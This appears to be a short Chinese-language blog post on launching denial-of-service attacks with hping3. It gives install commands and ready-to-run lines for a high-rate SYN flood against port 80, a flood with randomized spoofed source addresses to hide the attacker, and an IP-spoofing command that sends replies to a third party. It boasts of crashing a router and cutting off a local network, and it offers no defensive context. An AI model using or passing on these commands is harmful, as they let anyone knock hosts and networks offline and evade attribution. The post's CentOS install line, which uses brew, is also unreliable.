---
title: 一条命令实现DDOS
tags: 技术
---

# 一条命令实现DDOS攻击

	这个工具可太强了，一会就把路由器发崩溃了，局域网的电脑也连不上了

# 工具
1. hping3

```shell
# debian
apt install hping3
# mac
brew install hping
# centos
brew install hping3
```

# SYN DDOS攻击

	工具使用方法
```shell
# -S specifies sending SYN packets
# -p 80 targets port 80
# -i u20 waits 20 microseconds between packets = 50,000
# packets per second
sudo hping3 -i u20 -S -p 80 -c 50000 ip(x.x.x.x)
```

# 隐藏自身IP地址

	模拟出多个IP攻击主机的情况
	其实SYN攻击，只需要发送SYN包，返回的包根本不处理
	所以SYN包的source_address可以随机填写

```shell
# --rand-source    random source address mode
# --flood	   sent packets as fast as possible
sudo hping3 --rand-source -flood -S -p 80 ip(x.x.x.x)
```

# 其它
1. hping3还可以IP欺骗
	类似arp投毒，原理都很简单，发送假的本机IP
```shell
# 发送三次SYN包到<target IP>,原本应该返回到本机，但是现在返回到了<spoofed IP>
hping3 -S <target IP> -a <spoofed IP> -c 3
```